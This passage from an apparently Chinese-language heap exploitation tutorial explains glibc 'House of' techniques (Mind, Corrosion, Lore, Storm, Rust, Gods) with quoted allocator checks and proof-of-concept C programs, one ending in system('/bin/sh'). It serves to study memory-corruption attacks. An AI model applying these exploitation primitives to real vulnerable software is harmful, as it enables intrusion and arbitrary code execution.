mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">	  locked = <span class="number">1</span>;</span><br><span class="line">	  chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">	    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">      &#125;))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">if</span> (! have_lock)</span><br><span class="line">  &#123;</span><br><span class="line">    (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    locked = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure></div>
<p><a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_mind" >poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;	</span><br><span class="line">	<span class="type">int</span> HEAP_MAX_SIZE = <span class="number">0x4000000</span>;</span><br><span class="line">	<span class="type">int</span> MAX_SIZE = (<span class="number">128</span> * <span class="number">1024</span>) - <span class="number">0x100</span>;</span><br><span class="line">    </span><br><span class="line">	<span class="type">uint8_t</span> * fake_arena = <span class="built_in">malloc</span>(<span class="number">0x1000</span>); </span><br><span class="line">	<span class="type">uint8_t</span> * target_loc = fake_arena + <span class="number">0x28</span>;</span><br><span class="line">	<span class="type">uint8_t</span> * target_chunk = (<span class="type">uint8_t</span> *) fake_arena - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">	fake_arena[<span class="number">0x880</span>] = <span class="number">0xff</span>;</span><br><span class="line">	fake_arena[<span class="number">0x881</span>] = <span class="number">0xff</span>; </span><br><span class="line">	fake_arena[<span class="number">0x882</span>] = <span class="number">0xff</span>; </span><br><span class="line">	fake_arena[<span class="number">0x883</span>] = <span class="number">0xff</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span> new_arena_value = (((<span class="type">uint64_t</span>)target_chunk) + HEAP_MAX_SIZE) &amp; ~(HEAP_MAX_SIZE - <span class="number">1</span>);</span><br><span class="line">	<span class="type">uint64_t</span> * fake_heap_info = (<span class="type">uint64_t</span> *)new_arena_value;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span> * user_mem = <span class="built_in">malloc</span>(MAX_SIZE);</span><br><span class="line">	<span class="keyword">while</span>((<span class="type">long</span> <span class="type">long</span>)user_mem &lt; new_arena_value)&#123;</span><br><span class="line">        <span class="comment">// 使heap_for_ptr(victim)落在fake_heap_info上</span></span><br><span class="line">		user_mem = <span class="built_in">malloc</span>(MAX_SIZE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="type">uint64_t</span> * fastbin_chunk = <span class="built_in">malloc</span>(<span class="number">0x50</span>);</span><br><span class="line">	<span class="type">uint64_t</span> * chunk_ptr = fastbin_chunk - <span class="number">2</span>;</span><br><span class="line">    </span><br><span class="line">	fake_heap_info[<span class="number">0</span>] = (<span class="type">uint64_t</span>) fake_arena; <span class="comment">// Setting the fake ar_ptr (arena)</span></span><br><span class="line">	chunk_ptr[<span class="number">1</span>] = <span class="number">0x60</span> | <span class="number">0x4</span>; <span class="comment">// Setting the non-main arena bit</span></span><br><span class="line">	<span class="built_in">free</span>(fastbin_chunk); <span class="comment">// Trigger the madness</span></span><br><span class="line"></span><br><span class="line">	assert(*((<span class="type">unsigned</span> <span class="type">long</span> *)(target_loc)) != <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h1 id="House-of-Corrosion"><a href="#House-of-Corrosion" class="headerlink" title="House of Corrosion"></a>House of Corrosion</h1><p>house of Corrosion 是利用 malloc 和 free 过程中对 fastbinsY 数组边界检查不严格，通过修改 global_max_fast 为一个很大的值，造成 fastbinsY 数组越界，最终导致任意地址写的一种堆利用手法。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/1366514a21b40e8a1327dcbe885c759e.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ></p>
<p>如果存在 UAF 漏洞的，那么可以通过修改 chunk 的 fd 再将 chunk 申请出来的的方式在 target 上写一个任意值。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/ea966ded7fa7ef248e758e930156c49b.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ><br>更进一步，可以将任意地址的值写到其它任意地址上。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/503845dadb6d5e57394e202fffe3b1c5.png"
                      alt="在这里插入图片描述" style="zoom: 33%;" 
                ><br>glibc-2.27 起增加了对 global_max_fast 的检测，但实际分析汇编发现检测被优化掉了。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">get_max_fast(<span class="type">void</span>) &#123;</span><br><span class="line">    <span class="comment">/* Tell the GCC optimizers that global_max_fast is never larger</span></span><br><span class="line"><span class="comment">       than MAX_FAST_SIZE.  This avoids out-of-bounds array accesses in</span></span><br><span class="line"><span class="comment">       _int_malloc after constant propagation of the size parameter.</span></span><br><span class="line"><span class="comment">       (The code never executes because malloc preserves the</span></span><br><span class="line"><span class="comment">       global_max_fast invariant, but the optimizers may not recognize</span></span><br><span class="line"><span class="comment">       this.)  */</span></span><br><span class="line">    <span class="keyword">if</span> (global_max_fast &gt; MAX_FAST_SIZE)</span><br><span class="line">        __builtin_unreachable();</span><br><span class="line">    <span class="keyword">return</span> global_max_fast;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/3eadb9da0e6eaac17723bb9902834bc4.png"
                      alt="在这里插入图片描述"
                ><br>在 glibc-2.37 版本中，global_max_fast 的数据类型被修改为了 int8_u，进而导致可控的空间范围大幅度缩小。</p>
<h1 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h1><p>以 how2heap 为例：</p>
<ol>
<li><p>首先申请大小在 small bin 范围的 chunk 。</p>
</li>
<li><p>申请一个 chunk 防止 free chunk1 时与 top chunk 合并。</p>
</li>
<li><p>释放 chunk 进入 unsort bin 。</p>
</li>
<li><p>申请一个 更大的内存使 chunk1 进入 small bin ，此时状态如下图：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/9015a5827307435b3e85d2085a890da4.png"
                      alt="在这里插入图片描述" style="zoom:25%;" 
                >
</li>
<li><p>如下图形式，绕过检查：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">	errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">	<span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
 <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/14c140819bdb4f2c84a6b4bcb6159898.png"
                      alt="在这里插入图片描述" style="zoom:25%;" 
                >
</li>
<li><p>两次申请 chunk 即可获得 buf1 处的 chunk 。</p>
</li>
</ol>
<h1 id="House-of-Storm"><a href="#House-of-Storm" class="headerlink" title="House of Storm"></a>House of Storm</h1><p>unsorted bin attack 能够通过将目标地址链入 unsorted bin 然后取出其中另一个 chunk 从而在目标地址对应的 bk 写入  <code>unsorted_chunks (av)</code>  ，然而如果我们想要将链入 unsorted bin 的 fake chunk 申请出来却通不过检查。这就需要利用 large bin 的特性伪造 fake chunk 的 size 和 fd 字段。这种攻击方式称为 House of storm 。<br>漏洞利用条件:</p>
<ul>
<li>需要攻击者在 largebin 和 unsorted_bin 中分别布置一个 chunk 这两个 chunk 需要在归位之后处于同一个 largebin 的 index 中且 unsortedbin 中的 chunk 要比 largebin 中的大。</li>
<li>需要 unsorted_bin 中的 bk 指针可控。</li>
<li>需要 largebin 中的 bk 指针和 bk_nextsize 指针可控。</li>
</ul>
<p>下面举一个实际例子：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// gcc -ggdb -fpie -pie -o house_of_storm house_of_storm.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">char</span> chunk_head[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">char</span> content[<span class="number">0x10</span>];</span><br><span class="line">&#125; fake;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *large_bin, *unsorted_bin;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *fake_chunk;</span><br><span class="line">    <span class="type">char</span> *ptr;</span><br><span class="line"></span><br><span class="line">    unsorted_bin = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0X18</span>);</span><br><span class="line">    large_bin = <span class="built_in">malloc</span>(<span class="number">0x408</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(large_bin);</span><br><span class="line">    <span class="built_in">free</span>(unsorted_bin);</span><br><span class="line">    unsorted_bin = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">    <span class="built_in">free</span>(unsorted_bin);</span><br><span class="line"></span><br><span class="line">    fake_chunk = ((<span class="type">unsigned</span> <span class="type">long</span>) fake.content) - <span class="number">0x10</span>;</span><br><span class="line">    unsorted_bin[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>) fake_chunk;</span><br><span class="line"></span><br><span class="line">    large_bin[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>) fake_chunk + <span class="number">8</span>;</span><br><span class="line">    large_bin[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>) fake_chunk - <span class="number">0x18</span> - <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    ptr = <span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="built_in">strncpy</span>(ptr, <span class="string">&quot;/bin/sh&quot;</span>, <span class="number">0x48</span> - <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(fake.content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>首先进行如下修改：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/d7893a21262ab86ca0569abd25395d2c.png"
                      alt="在这里插入图片描述" style="zoom:25%;" 
                ></p>
<p>当申请 0x48 大小的内存时，会先遍历 unsorted bin 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ((victim = <span class="built_in">unsorted_chunks</span>(av)-&gt;bk) != <span class="built_in">unsorted_chunks</span>(av))</span><br></pre></td></tr></table></figure></div>
<p>由于倒序遍历 unsorted bin 时取最后的 chunk 是根据 <code>unsorted_chunks(av)-&gt;bk</code> 取的，因此先访问的是 0x418 大小的 chunk 。<br>因为不满足下面这个判断，因此不会从该 chunk 上切下合适的 chunk ，而是将其放入 large bin 中。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">in_smallbin_range</span>(nb) &amp;&amp;</span><br><span class="line">    bck == <span class="built_in">unsorted_chunks</span>(av) &amp;&amp;</span><br><span class="line">    victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br></pre></td></tr></table></figure></div>
<p>在放入 large bin 中之前，先要将其从 unsorted bin 中取出，这就完成了一次 unsorted bin attack 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">unsorted_chunks</span>(av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = <span class="built_in">unsorted_chunks</span>(av);</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/862cd92cc549f568a59728aee8973321.png"
                      alt="在这里插入图片描述" style="zoom: 25%;" 
                >

<p>由于取出的 chunk 大小不在 small bin 范围，所以将放入 large bin 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">in_smallbin_range</span>(size)) &#123;</span><br><span class="line">	...</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>判断 large bin 是否为空，这里显然不为空。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">victim_index = <span class="built_in">largebin_index</span>(size);</span><br><span class="line">bck = <span class="built_in">bin_at</span>(av, victim_index);</span><br><span class="line">fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (fwd != bck) &#123;</span><br><span class="line">	...</span><br><span class="line">&#125; <span class="keyword">else</span> ...</span><br></pre></td></tr></table></figure></div>
<p>large bin 中的 chunk 是按大小降序排列。首先特判大小小于最小的 chunk 的情况。这里通过 <code>bk</code> 访问最小的 chunk ，根据事先的构造，待加入 large bin 的 chunk 大于 large bin 中最小的 chunk ，因此执行的是 else 里的内容。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size)) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">assert</span>((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);<span class="comment">//默认不启用assert</span></span><br><span class="line">    <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size) &#123;</span><br><span class="line">        fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">        <span class="built_in">assert</span>((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">        fwd = fwd-&gt;fd;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        victim-&gt;fd_nextsize = fwd;</span><br><span class="line">        victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">        fwd-&gt;bk_nextsize = victim;</span><br><span class="line">        victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line">    bck = fwd-&gt;bk;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>large bin 对 fake chunk 进行了如下修改，伪造了 size 和 bk 字段。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/1bc5ed03a57d61aa9cbee334cc831e76.png"
                      alt="在这里插入图片描述"
                ></p>
<p>因为在<strong>开启 PIE</strong> 之后 chunk 的地址多为 0x55 和 0x56 开头，且长度为 6 字节，因此刚好在 size 字段中截取出合适的数值。<br><code>__int_malloc</code> 在拿到 chunk 后返回到 <code>__libc_malloc</code> ，<code>__libc_malloc</code> 会对 chunk 的进行检查。</p>
<ul>
<li>如果 size 为 0x55 那么 <code>IS_MAPPED</code> 没有置位，会判断 <code>arena_for_chunk(mem2chunk(victim))</code> 。由于 <code>NON_MAIN_ARENA</code> 置位导致计算出的 <code>arena</code> 不是 <code>main_arena(ar_ptr)</code> 因此通不过检查。</li>
<li>如果 size 为 0x56 那么 <code>IS_MAPPED</code> 置位可以通过检查。<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">assert</span>(!victim || <span class="built_in">chunk_is_mmapped</span>(<span class="built_in">mem2chunk</span>(victim)) </span><br><span class="line">       || ar_ptr == <span class="built_in">arena_for_chunk</span>(<span class="built_in">mem2chunk</span>(victim)));</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>之后继续遍历 unsorted bin 于是便将 fake chunk 申请出来。</p>
<p>glibc-2.27 加入 tcache，此时是先遍历 unsorted bin，即使找到合适的 chunk 也会放入 tcache 然后继续遍历，因此还会触发报错。因此需要先将 tcache 填满，并且最后通过 <code>calloc</code> 申请触发 house of storm 。</p>
<p>glibc-2.28 开始 unsorted bin 会有如下检查：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>glibc-2.30 开始 large bin 会有下面这条检查</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">  <span class="built_in">malloc_printerr</span> (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br></pre></td></tr></table></figure></div>
<p>因此此方法失效。</p>
<h1 id="House-of-Rust"><a href="#House-of-Rust" class="headerlink" title="House of Rust"></a>House of Rust</h1><p>该技巧就是 tcachebin stash unlinking + largebin attack 的组合技巧。</p>
<p>该利用方法的主要步骤如下：</p>
<ul>
<li><p>把 <code>tcachebin[0x90]</code> 填满，把 <code>smallbin[0x90]</code> 也填满。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/image-20241108031734130.png"
                      alt="image-20241108031734130"
                ></p>
</li>
<li><p>把最后一个 smallbin 0x90 的 chunk 的 <code>size</code> 改成 0xb0，将其释放到 <code>tcachebin[0xb0]</code>，这一步主要是为了改变其 <code>bk</code> 指向 <code>tcache_perthread_struct</code>，可以部分修改低位的字节，以便下一步分配到目标区域。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/a459435d702e55e5ee364d57cc7e23da.png"
                      alt="在这里插入图片描述"
                ></p>
</li>
<li><p>使用 largebin attack 往上一步的 <code>bk-&gt;bk</code> 写一个合法地址。（新版本的 Large Bin Attack 需要泄露 <code>tcache_perthread_struct</code> 的地址）<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/c5faef0f5fb2ddd93fd28b974ca22ab1.png"
                      alt="在这里插入图片描述"
                ></p>
</li>
<li><p>耗尽 <code>tcachebin[0x90]</code>，再分配的时候就会触发 tcache stash unlink，之后就能分配到 <code>tcache_perthread_struct</code> 结构体。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-heap-exploit/images/51fb7345e938cd79dfef912f6f3f659e.png"
                      alt="在这里插入图片描述"
                ></p>
</li>
<li><p>利用 tcache stash unlink 在 <code>tcache_perthread_struct</code> 上写一个 libc 地址。</p>
</li>
<li><p>通过控制 <code>tcache_perthread_struct</code> 结构体，部分写上面的 libc 地址，分配到 stdout 结构体，泄露信息。</p>
</li>
<li><p>通过控制 <code>tcache_perthread_struct</code> 结构体分配到任意地址。</p>
</li>
</ul>
<p>这里 <a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_rust" >poc <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> 只实现了劫持 <code>tcache_perthread_struct</code> ，后续利用需要根据实际情况进行。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TCACHE_NUM 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SMALL_NUM 7</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">void</span> *tcache_chunk[TCACHE_NUM];</span><br><span class="line">    <span class="type">size_t</span> *small_chunk[SMALL_NUM];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; TCACHE_NUM; i++) &#123;</span><br><span class="line">        tcache_chunk[i] = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SMALL_NUM; i++) &#123;</span><br><span class="line">        small_chunk[i] = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">        <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; TCACHE_NUM; i++) &#123;</span><br><span class="line">        <span class="built_in">free</span>(tcache_chunk[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; SMALL_NUM; i++) &#123;</span><br><span class="line">        <span class="built_in">free</span>(small_chunk[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">free</span>(<span class="built_in">malloc</span>(<span class="number">0x500</span>));</span><br><span class="line">    small_chunk[SMALL_NUM - <span class="number">1</span>][<span class="number">-1</span>] = <span class="number">0xb1</span>;</span><br><span class="line">    <span class="built_in">free</span>(small_chunk[SMALL_NUM - <span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> tcache_perthread_struct = small_chunk[SMALL_NUM - <span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] tcache_perthread_struct: %p\n&quot;</span>, tcache_perthread_struct);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *large_chunk = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="type">void</span> *unsorted_chunk = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">free</span>(large_chunk);</span><br><span class="line">    <span class="built_in">free</span>(<span class="built_in">malloc</span>(<span class="number">0x500</span>));</span><br><span class="line">    large_chunk[<span class="number">3</span>] = tcache_perthread_struct - <span class="number">8</span>;</span><br><span class="line">    <span class="built_in">free</span>(unsorted_chunk);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; TCACHE_NUM; i++) &#123;</span><br><span class="line">        tcache_chunk[i] = <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x88</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] hijack tcache_perthread_struct: %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x88</span>));</span><br><span class="line"></span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>glibc-2.34 之后，<code>tcache_key</code> 是一个随机数，不是 <code>tcache_perthread_struct</code> 了。</p>
<p>所以，此时可以加上 largebin attack，把以上的第二步变为：继续用 largebin attack 向其 <code>bk</code> 写一个堆地址，然后还要部分写 <code>bk</code> 使其落在 <code>tcache_perthread_struct</code> 区域。其他步骤一样。</p>
<p>或者，在 smallbin 里面放 9 个，这样第 8 个的 <code>bk</code> 肯定就是一个堆地址。此时就需要爆破 1&#x2F;16 的堆，1&#x2F;16 的 glibc 地址，成功的概率是 1&#x2F;256。</p>
<h1 id="House-of-Crust"><a href="#House-of-Crust" class="headerlink" title="House of Crust"></a>House of Crust</h1><p>在 House of Rust 的基础上修改 <code>global_max_fast</code> 然后借助 House of Corrosion 完成后续利用。</p>
<h1 id="House-of-Gods"><a href="#House-of-Gods" class="headerlink" title="House of Gods"></a>House of Gods</h1><p><code>main_arena</code> 中有一个记录 bins 中是否有空闲 chunk 的结构 <code>binmap</code> 。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  [...]</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">     by free_list_lock in arena.c.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">     the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">     free_list_lock in arena.c.  */</span></span><br><span class="line">  INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p><code>binmap</code> 只有在 malloc 过程中的下面两个场景会被修改：</p>
<ul>
<li>在遍历 unsorted bin 中的空闲 chunk 时如果将该 chunk 放入对应的 small bin 或 large bin 中会在 <code>binmap</code> 对应位置置位。  <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">mark_bin(av, victim_index);</span><br><span class="line"></span><br><span class="line">定义:  </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> mark_bin(m, i) ((m)-&gt;binmap[idx2block(i)] |= idx2bit(i))</span></span><br><span class="line">替换:  </span><br><span class="line">((av)-&gt;binmap[((victim_index) &gt;&gt; <span class="number">5</span>)] |= ((<span class="number">1U</span> &lt;&lt; ((victim_index) &amp; ((<span class="number">1U</span> &lt;&lt; <span class="number">5</span>) - <span class="number">1</span>)))))</span><br></pre></td></tr></table></figure></div></li>
<li>在遍历 small bin + large bin 找大小不小于当前 chunk 的空闲 chunk 时如果对应 <code>binmap</code> 置位的 bin 是空闲的就将对应位置复位。  <div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit;</span><br></pre></td></tr></table></figure></div>
